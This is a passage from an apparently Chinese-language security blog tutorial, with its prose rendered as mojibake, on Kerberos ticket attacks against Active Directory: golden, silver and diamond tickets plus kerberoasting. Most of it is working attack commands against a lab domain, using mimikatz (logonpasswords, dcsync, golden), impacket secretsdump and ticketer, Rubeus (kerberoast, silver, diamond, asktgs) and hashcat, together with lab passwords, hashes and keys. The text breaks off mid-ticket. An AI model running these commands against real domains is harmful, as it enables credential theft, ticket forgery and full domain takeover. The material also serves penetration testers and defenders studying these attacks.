src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536920410-95021d33-5561-4ba8-86f2-4011e5817528.png"></p><p>å…¶å® RID ä¹Ÿå¯ä»¥ä»»æ„ï¼Œä½†æ˜¯æŸäº›ç³»ç»Ÿä¼šå°è¯•åå‘æŸ¥æ‰¾äº§ç”Ÿå¼‚å¸¸ï¼Œéå¿…è¦æƒ…å†µä¸‹ä¸å»ºè®®è¿™ä¹ˆåš</p><h3 id="ç»„æˆå‘˜èµ„æ ¼"><a href="#ç»„æˆå‘˜èµ„æ ¼" class="headerlink" title="ç»„æˆå‘˜èµ„æ ¼"></a>ç»„æˆå‘˜èµ„æ ¼</h3><p>ç»„ RID åˆ—è¡¨ä¸éœ€è¦ä¸æ¬ºéª—ç¥¨è¯ä¸­çš„å¸æˆ·æ‰€å±çš„å®é™…ç»„åˆ—è¡¨ç›¸å¯¹åº”ï¼Œå³ä½¿ä½ çš„ç”¨æˆ·åæ˜¯ä½æƒé™ï¼Œä½ å¯ä»¥åŒ…å«<code>Domain Admins</code>ç»„çš„ RIDã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:rootkit.org /sid:S-1-5-21-3759881954-2993291187-3577547808 /aes256:3e65833fc9930ea83015501ec30c161da401faf6cfed9526b9ceff16c8ade745 /user:micle /id:1139 /groups:500,501,513,512,520,518,519 /ptt</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536920540-bd8c1f6a-de16-4891-8dbd-0ab0bb6c2f46.png"></p><h3 id="impacket-ä¸‹é»„é‡‘ç¥¨æ®çš„åˆ©ç”¨"><a href="#impacket-ä¸‹é»„é‡‘ç¥¨æ®çš„åˆ©ç”¨" class="headerlink" title="impacket ä¸‹é»„é‡‘ç¥¨æ®çš„åˆ©ç”¨"></a>impacket ä¸‹é»„é‡‘ç¥¨æ®çš„åˆ©ç”¨</h3><p><code>lookupid.py</code>è„šæœ¬ä»¥æšä¸¾åŸŸ SID</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python lookupsid.py &quot;rookit/administrator:admin!@#45&quot;@192.168.3.131</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536920760-a3769aaf-15b1-415d-84d1-2a06ffc9e052.png"></p><p><code>secretsdump.py</code>ç”¨äºæå– <code>krbtgt</code>å“ˆå¸Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py &quot;rookit/administrator:admin!@#45&quot;@192.168.3.131 -outputfile krbhash -user-status</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536920704-f6fea906-e0db-42f1-acce-10650b09e3e5.png"></p><p><code>ticketer.py</code> è„šæœ¬åˆ›å»ºTGT&#x2F;TGSå·¥å•ï¼Œå·¥å•æœŸé™å›ºå®šä¸º10å¹´åï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ticketer.py -nthash c3d5042c67ef5f461d0ba6ecdd9ea449 -domain-sid S-1-5-21-3759881954-2993291187-3577547808 -domain rootkit.org administrator</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536920572-10f68acf-784b-453f-b6ed-96c5db63a308.png"></p><p>ä½¿ç”¨<code>ticket_converter.py</code>å°†ccacheæ–‡ä»¶è½¬æ¢ä¸ºkirbiæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ticketConverter.py administrator.ccache ticket.kirbi</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536920830-4918c11a-cce1-4312-93b3-fb8902caeff7.png"></p><p>mimikatzè¿›è¡Œæ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt ticket.kirbi</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536921036-4de8a07f-7ede-4458-85c0-f3f33357bdff.png"></p><h3 id="ä½¿ç”¨-Rubeus-exe-ä¼ é€’ç¥¨æ®"><a href="#ä½¿ç”¨-Rubeus-exe-ä¼ é€’ç¥¨æ®" class="headerlink" title="ä½¿ç”¨ Rubeus.exe ä¼ é€’ç¥¨æ®"></a>ä½¿ç”¨ Rubeus.exe ä¼ é€’ç¥¨æ®</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe ptt /ticket:ticket.kirbi</span><br></pre></td></tr></table></figure><h3 id="msf-ä¸‹çš„-mimikatz"><a href="#msf-ä¸‹çš„-mimikatz" class="headerlink" title="msf ä¸‹çš„ mimikatz"></a>msf ä¸‹çš„ mimikatz</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dcsync_ntlm krbtgt</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536921311-a8299fae-3003-4348-9955-769e80fc3a03.png"></p><p>ç¡®å®šå½“å‰åŸŸ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536921522-7c4f808b-771e-4383-9082-4ab52c78ff7c.png"></p><p>ç”Ÿæˆç¥¨æ®å¹¶å¯¼å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">golden_ticket_create -d rootkit.local -u administrator -s S-1-5-21-3759881954-2993291187-3577547808 -k c3d5042c67ef5f461d0ba6ecdd9ea449 -t /home/kali/ticket.kirbi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kerberos_ticket_use /home/kali/ticket.kirbi</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536921338-6f6a3068-9147-4607-8b03-f310ff8a3ec7.png"></p><h2 id="0x03-ç™½é“¶ç¥¨æ®-Silver-Ticket"><a href="#0x03-ç™½é“¶ç¥¨æ®-Silver-Ticket" class="headerlink" title="0x03 ç™½é“¶ç¥¨æ® Silver Ticket"></a>0x03 ç™½é“¶ç¥¨æ® Silver Ticket</h2><h3 id="ä»‹ç»-1"><a href="#ä»‹ç»-1" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h3><p>ç™½é“¶ç¥¨æ®æ˜¯ä¼ªé€ çš„ <code>Kerberos Ticket Grant Service ï¼ˆTGSï¼‰</code> ç¥¨è¯ï¼Œé“¶ç¥¨ä»…å…è®¸æ”»å‡»è€…ä¼ªé€ ç‰¹å®šæœåŠ¡çš„ç¥¨è¯æˆäºˆæœåŠ¡ ï¼ˆTGSï¼‰ ç¥¨æ®ã€‚TGS ç¥¨è¯ä½¿ç”¨æœåŠ¡çš„å¯†ç å“ˆå¸Œå€¼è¿›è¡ŒåŠ å¯†ï¼Œå› æ­¤å¦‚æœæ”»å‡»è€…çªƒå–äº†æœåŠ¡å¸æˆ·çš„å“ˆå¸Œå€¼ï¼Œå°±å¯ä»¥ç”Ÿæˆç™½é“¶ç¥¨æ®ã€‚</p><h3 id="åˆ©ç”¨æ¡ä»¶-1"><a href="#åˆ©ç”¨æ¡ä»¶-1" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h3><p>ç™½é“¶ç¥¨æ®æ‰€éœ€çš„åˆ©ç”¨æ¡ä»¶å’Œé»„é‡‘ç¥¨æ®æ˜¯ç›¸åŒçš„ï¼Œåªæ˜¯ç§˜é’¥æ¢æˆäº†å¯¹åº”æœåŠ¡çš„æœºå™¨è´¦æˆ· Hash(å°¾éƒ¨å¸¦$çš„å‡ä¸ºæœºå™¨è´¦æˆ·)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ç›®æ ‡åŸŸåï¼šæˆ‘è¿™é‡Œæ˜¯rootkit.org</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ç›®æ ‡åŸŸçš„sidï¼šåˆšåˆšlsadump::lsa æœ‰æ˜¾ç¤ºS-1-5-21-3759881954-2993291187-3577547808 æˆ–è€…whami /allä¹Ÿå¯ä»¥æŸ¥çœ‹</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">è¦æ¨¡æ‹Ÿçš„ç”¨æˆ·è´¦æˆ·åç§°ï¼šä¾‹å¦‚ Administrator</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">è¦æ¨¡æ‹Ÿçš„ç”¨æˆ·RIDï¼šRIDæ˜¯SIDå³è¾¹çš„æ•°å­—ï¼Œä¾‹å¦‚ç®¡ç†å‘˜æ˜¯500</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">è¯¥è´¦æˆ·æ‰€å±ç»„çš„RID:åŸŸç”¨æˆ·å’ŒåŸŸç®¡ç†å‘˜çš„RIDåˆ†åˆ«æ˜¯512å’Œ513</span><br></pre></td></tr></table></figure><h3 id="å°è¯•-mimikatz-æ³¨å…¥ç¥¨æ®"><a href="#å°è¯•-mimikatz-æ³¨å…¥ç¥¨æ®" class="headerlink" title="å°è¯• mimikatz æ³¨å…¥ç¥¨æ®"></a>å°è¯• mimikatz æ³¨å…¥ç¥¨æ®</h3><p>CIFSæ–‡ä»¶å…±äº«æœåŠ¡çš„å¯†ç å’Œè®¡ç®—æœºè´¦æˆ·ç›¸åŒï¼Œä½¿ç”¨ mimikatz æŠ“ä¸€ä¸‹å¯†ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536921259-808acbec-9796-4f9d-a204-00cea47f560c.png"></p><p>æŸ¥çœ‹Sid</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536921385-2dffc8b8-5d8a-419f-a471-5c40b293a275.png"></p><p>æ³¨å…¥ç¥¨æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /sid:S-1-5-21-202412995-3582062751-167045153 /domain:rootkit.org /target:SRV-WEB-KIT.rootkit.org /service:cifs /rc4:78e1c42dbff68fdd87ea7abd70b67533 /user:1111 /ptt</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536921665-4ee8aff1-f92f-4fd4-917c-d772ee74946f.png"></p><h3 id="ä½¿ç”¨-rubeus-è¿›è¡Œæ³¨å…¥"><a href="#ä½¿ç”¨-rubeus-è¿›è¡Œæ³¨å…¥" class="headerlink" title="ä½¿ç”¨ rubeus è¿›è¡Œæ³¨å…¥"></a>ä½¿ç”¨ rubeus è¿›è¡Œæ³¨å…¥</h3><p>ä¸‹é¢å°†å°è¯•è·å– <code>mssql</code> æœåŠ¡çš„ç¥¨æ®ï¼Œç”±äºæœ¬åœ°æµ‹è¯•ï¼Œéœ€è¦å‘æœåŠ¡æ·»åŠ ä¸€ä¸ªè´¦æˆ·sqluseræ¥è¿è¡Œ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536921725-9df94bfe-a8de-4fae-ba1b-c0186f83c0b1.png"></p><p>ä½¿ç”¨ rubeus è½¬å‚¨ tgs</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rubeus.exe kerberoast /domain:rootkit.org /creduser:rootkit\windows7 /credpassword:admin!@#45 /nowrap</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536921761-03d46e3f-0413-4217-99e3-1e890e475700.png"></p><p>ä½¿ç”¨ hashcat çˆ†ç ´å¯†ç ,å¯†ç ä¸º Admin12345</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13100 &#x27;$krb5tgs$23$*sqluser......çœç•¥&#x27; &#x27;/home/kali/Desktop/10_million_password_list_top_100000.txt&#x27;  --force</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536922395-930e9a08-e795-45cf-aadd-55fbdf985673.png"></p><p>ä½¿ç”¨ <code>rubeus</code>è½¬ä¸º <code>ntlm hash</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe hash /password:Admin12345</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536921875-823e2569-db4e-4d1e-ad5b-b05ac6fadfc4.png"></p><p>ä½¿ç”¨<code>whoami /user</code>è·å–sidï¼ŒæœåŠ¡å<code>service</code>æ˜¯ä¸Šé¢<code>kubeus</code>è·å–åˆ°çš„æœåŠ¡å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rubeus.exe silver /service:MSSQLSvc/win7.rootkit.org /rc4:CCEF208C6485269C20DB2CAD21734FE7 /sid:S-1-5-21-3759881954-2993291187-3577547808 /user:test123333 /domain:rootkit.org /ptt</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536922009-c0b4a07f-428f-4a86-8304-d5e4a4f9e7c8.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536922048-216b5f33-bb52-40e0-8112-2a31cde5f87e.png"></p><p>è¿œç¨‹è¿æ¥æ•°æ®åº“æ‰§è¡Œå‘½ä»¤å³å¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlcmd -S 192.168.1.2,1433</span><br></pre></td></tr></table></figure><h3 id="é»„é‡‘ç¥¨æ®ä¸ç™½é“¶ç¥¨æ®çš„åŒºåˆ«"><a href="#é»„é‡‘ç¥¨æ®ä¸ç™½é“¶ç¥¨æ®çš„åŒºåˆ«" class="headerlink" title="é»„é‡‘ç¥¨æ®ä¸ç™½é“¶ç¥¨æ®çš„åŒºåˆ«"></a>é»„é‡‘ç¥¨æ®ä¸ç™½é“¶ç¥¨æ®çš„åŒºåˆ«</h3><ol><li>è®¿é—®æƒé™ä¸åŒ</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">é»„é‡‘ç¥¨æ® ä¼ªé€ TGT,å¯ä»¥è·å–ä»»ä½•KerberosæœåŠ¡æƒé™ </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ç™½é“¶ç¥¨æ® ä¼ªé€ TGS,åªèƒ½è®¿é—®æŒ‡å®šçš„æœåŠ¡ï¼Œç™½é“¶ç¥¨æ®çš„æƒé™å°±è¿œä¸å¦‚é»„é‡‘ç¥¨æ®çš„æƒé™</span><br></pre></td></tr></table></figure><ol><li>åŠ å¯†æ–¹å¼ä¸åŒ</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">é»„é‡‘ç¥¨æ® ç”±Kerberosçš„NTLM HashåŠ å¯† </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ç™½é“¶ç¥¨æ® ç”±æœåŠ¡è´¦å·(é€šå¸¸ä¸ºè®¡ç®—æœºè´¦æˆ·)NTLM HashåŠ å¯†ï¼Œæ›´åŠ éšè”½</span><br></pre></td></tr></table></figure><ol><li>è®¤è¯æµç¨‹ä¸åŒ</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">é»„é‡‘ç¥¨æ® åˆ©ç”¨è¿‡ç¨‹éœ€è¦è®¿é—®åŸŸæ§DC</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ç™½é“¶ç¥¨æ® ä¸ç»è¿‡KDCï¼Œå› æ­¤ç™½é“¶ç¥¨æ®æ—¥å¿—ç›¸å¯¹äºé»„é‡‘ç¥¨æ®ä¼šæ›´å°‘ï¼ŒåŒæ—¶ç™½é“¶ç¥¨æ®çš„æ—¥å¿—éƒ½åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šï¼ŒåŸŸæ§ä¸Šä¸ä¼šæœ‰æ—¥å¿—</span><br></pre></td></tr></table></figure><h2 id="0x04-é’»çŸ³ç¥¨æ®-Diamond-Ticket"><a href="#0x04-é’»çŸ³ç¥¨æ®-Diamond-Ticket" class="headerlink" title="0x04 é’»çŸ³ç¥¨æ® Diamond Ticket"></a>0x04 é’»çŸ³ç¥¨æ® Diamond Ticket</h2><p>é»„é‡‘ç¥¨æ®æ”»å‡»å’Œé’»çŸ³ç¥¨æ®æ”»å‡»éƒ½éœ€è¦è®¿é—®<code>krbtgt</code>å¯†é’¥ã€‚ç„¶è€Œï¼Œé’»çŸ³ç¥¨æ®æ”»å‡»éœ€è¦è®¿é—®<code>AES256</code>å¯†é’¥ã€‚é»„é‡‘ç¥¨è¯æ”»å‡»åˆ™æ˜¯åˆ©ç”¨ä¼ªé€ ç¥¨è¯æˆäºˆç¥¨è¯ (TGT) ï¼Œè€Œé’»çŸ³ç¥¨è¯æ”»å‡»åˆ™åˆ©ç”¨äº†<a href="https://so.csdn.net/so/search?q=%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8&spm=1001.2101.3001.7020">åŸŸæ§åˆ¶å™¨</a> (DC) è¯·æ±‚çš„çœŸå® TGT è¿›è¡Œè§£å¯†å’Œé‡æ–°åŠ å¯†è¿›è¡Œç¥¨æ®æ”»å‡»ã€‚</p><p>é»„é‡‘ç¥¨æ®å……åˆ†åˆ©ç”¨äº†èƒ½å¤Ÿä»å¤´å¼€å§‹ä¼ªé€ ç¥¨æ®æˆäºˆç¥¨æ® (TGT) çš„ä¼˜åŠ¿ï¼Œè€Œé’»çŸ³ç¥¨æ®åˆ™åˆ©ç”¨äº†èƒ½å¤Ÿè§£å¯†å’Œé‡æ–°åŠ å¯†ä»åŸŸæ§åˆ¶å™¨ (DC) è¯·æ±‚çš„çœŸå® TGT çš„ä¼˜åŠ¿ã€‚</p><h3 id="é’»çŸ³PAC"><a href="#é’»çŸ³PAC" class="headerlink" title="é’»çŸ³PAC"></a>é’»çŸ³PAC</h3><p><strong>ä»€ä¹ˆæ˜¯PAC</strong></p><p>PAC æ˜¯ä¸€ç§ä¼ é€’åŸŸæ§åˆ¶å™¨ (DC)æä¾›çš„æˆæƒç›¸å…³ä¿¡æ¯çš„ç»“æ„ã€‚èº«ä»½éªŒè¯åè®®ä½¿ç”¨ PAC æ¥éªŒè¯èº«ä»½ä»¥ä¼ è¾“æˆæƒä¿¡æ¯ï¼Œä»è€Œæ§åˆ¶å¯¹èµ„æºçš„è®¿é—®ã€‚è¯´ç™½äº†å°±æ˜¯æ¥éªŒè¯èº«ä»½æ˜¯å¦æœ‰æ•ˆçš„ã€‚</p><p>æœ€åˆçš„<code>é’»çŸ³PAC</code>æ”»å‡»è¿œæ²¡æœ‰é’»çŸ³ç¥¨æ®çµæ´»ï¼Œæ”»å‡»æˆåŠŸéœ€è¦ä¸¤ä¸ªæ¡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. åœ¨æ²¡æœ‰ç‰¹æƒå±æ€§è¯ä¹¦ï¼ˆPACï¼‰çš„æƒ…å†µä¸‹è¯·æ±‚TGT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2. ç¡®ä¿è¦è®¿é—®çš„æœåŠ¡çš„æœåŠ¡å¸æˆ·æœªåœ¨å…¶ UserAccountControl (UAC) å±æ€§ä¸­è®¾ç½®â€œNAâ€ä½</span><br></pre></td></tr></table></figure><p>åœ¨æœåŠ¡å¸æˆ·çš„ UAC å±æ€§ä¸­è®¾ç½® NA ä½åï¼Œå‘è¯¥æœåŠ¡å¸æˆ·è¯·æ±‚çš„ ST æ²¡æœ‰ PAC ï¼Œæ”»å‡»è€…ä¸‹ä¸€ä¸ªé˜¶æ®µå°±å¯ä»¥æ„é€ æ¶æ„ PAC æ³¨å…¥åˆ° ST ä¸­å®ç°æ”»å‡»ã€‚</p><p>ç”±äº2021å¹´å‘å¸ƒçš„è¡¥ä¸æ— æ³•å†åœ¨å®Œå…¨æœ€æ–°çš„åŸŸæ§åˆ¶å™¨ (DC) ä¸Šä½¿ç”¨æ²¡æœ‰ PAC çš„ TGTã€‚æˆ‘ä»¬çŸ¥é“éœ€è¦æ‹¥æœ‰<code>KRBTGT</code>å¯†é’¥ï¼Œå¹¶ä¸”æ”»å‡»åˆ©ç”¨ä»»ä½•å…¶ä»–æœ‰æ•ˆå¸æˆ·æ¥è¯·æ±‚ TGTã€‚æ‰€ä»¥æˆ‘ä»¬æƒ³ä¸ºä»€ä¹ˆä¸ç›´æ¥è§£å¯†è¯¥ TGTï¼ŒæŒ‰ç…§æˆ‘ä»¬æƒ³è¦çš„æ–¹å¼ä¿®æ”¹å®ƒï¼Œé‡æ–°è®¡ç®— PAC ç­¾åï¼Œç„¶åé‡æ–°åŠ å¯†å®ƒã€‚è¿™å°±æ˜¯æˆ‘ä»¬æ‰€è¯´çš„é’»çŸ³ç¥¨æ®ã€‚</p><h3 id="é’»çŸ³ç¥¨æ®æ”»å‡»åˆ©ç”¨"><a href="#é’»çŸ³ç¥¨æ®æ”»å‡»åˆ©ç”¨" class="headerlink" title="é’»çŸ³ç¥¨æ®æ”»å‡»åˆ©ç”¨"></a>é’»çŸ³ç¥¨æ®æ”»å‡»åˆ©ç”¨</h3><p>æˆ‘ä»¬ä½¿ç”¨é’»çŸ³ç¥¨æ®çš„æ€è·¯å°±æ˜¯ä½¿ç”¨ä½æƒé™çš„ç”¨æˆ·å‘åŸŸæ§è¯·æ±‚ä¸€ä¸ªæ™®é€šçš„ <code>TGT</code>ï¼Œéšåè¿›è¡Œè§£å¯†ä¿®æ”¹ç­¾åå’Œé‡æ–°åŠ å¯†å³å¯ï¼Œå½“ç„¶è¿™äº›äº‹æƒ…<code>Rubeus</code>ä¼šè‡ªåŠ¨å¸®æˆ‘ä»¬å®Œæˆï¼Œæˆ‘ä»¬åªéœ€è¦æä¾›ä¿¡æ¯å³å¯ã€‚</p><p>æœ¬åœ°å°è¯•<code>dir</code>æ‹’ç»è®¿é—®</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536922104-5c0d301a-4cda-4f2a-98df-9519564ba10d.png"></p><p>ä½¿ç”¨ <code>mimikatz</code> æŠ“å– <code>krbtgt</code> ç”¨æˆ· <code>aes256</code>å¯†é’¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:rootkit.org /user:krbtgt&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536922304-f15d4dc5-0f08-4339-926a-9224decc76d1.png"></p><p>ä½¿ç”¨é’»çŸ³ç¥¨æ®éœ€è¦æä¾›ä»¥ä¸‹ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">krbkey:3e65833fc9930ea83015501ec30c161da401faf6cfed9526b9ceff16c8ade745</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ä½æƒé™ç”¨æˆ·user:micle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ç”¨æˆ·å¯†ç password:Admin12345</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">domain:rootkit.org</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dc:owa2013.rootkit.org</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ticketuser:administrator //ä¼ªé€ çš„ç¥¨æ®ç”¨æˆ·åå¯ä»¥ä»»æ„ï¼Œä¸éœ€è¦åŸŸä¸­å­˜åœ¨è¯¥ç”¨æˆ·</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe diamond /krbkey:3e65833fc9930ea83015501ec30c161da401faf6cfed9526b9ceff16c8ade745 /user:micle /password:Admin12345 /enctype:aes /domain:rootkit.org /dc:owa2013.rootkit.org /ticketuser:test123 /ptt /nowrap</span><br></pre></td></tr></table></figure><p>ä»¥ä¸‹ä¸ºåŸ<code>TGT</code></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536922598-210360e7-d4a6-4ba0-97ee-e61172bd12e6.png"></p><p>è§£å¯†é‡æ–°æ„é€ çš„<code>TGT</code></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536922645-20d41036-0050-40c9-bc0e-8ec294ccb659.png"></p><p>åˆ©ç”¨æˆ‘ä»¬é‡æ–°æ„é€ çš„<code>TGT</code>å¯¹åŸŸæ§çš„<code>cifs</code>æœåŠ¡è¿›è¡Œç¥¨æ®æ³¨å…¥ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgs /ticket:doIFMjCCBS6gAwIBBaEDAgEWooIEOzCCBDdhggQzMIIEL6ADAgEFoQ0bC1JPT1RLSVQuT1JHoiAwHqADAgECoRcwFRsGa3JidGd0GwtST09US0lULk9SR6OCA/UwggPxoAMCARKhAwIBA6KCA+MEggPfj2PsZr7SGEqJsPPl5wG8ljBVM4yBAtxGQNxTQQPo6WBMTxcXS+3f3vyYs6qab0uZ+X5UW45e4aW8T8VhsTOkSJ1jokudegt8ILFKbHNpuUTMywsfgjRb6o+CQkfyZMGep1bQ9FoKHw+qPyd6ql7bYK50u1zO+uhNQ61cQDymFiDaqu0UBLh9yI4qY81gpycKOZSWqy0T/cH52hn22IuuxfL9dKN9qdRF+YCnrqy9MBSPx5E3MGVroJZrLYqgDfPQ9g+u1pPabnci8ac3J2S8isxbTscP7hutRATWTQWeauRvG1DbNN6qANWagDNpPy9JEqQoLbqrr3GD/FEQhaANSZlX2IPzLj8EsUcKQExEVSaWC3OuUwqNGWBNhc1m+aJL9mt6D42SwWMyFvmREmlj/lDR9kv9IQmqupcFCloBkewpyFBlecHkkSFKwXGvde65Y7Z/5vP1Iq1el2VrZPPMhywUhk5JwnRNhInDokhYFOWMIdY3w/C2PreLdEiL5aFUc7e01y7uQV5Wbe/OJ6XZdNhbYKXZ9lzZdHAqSayQmo0TRpBCBw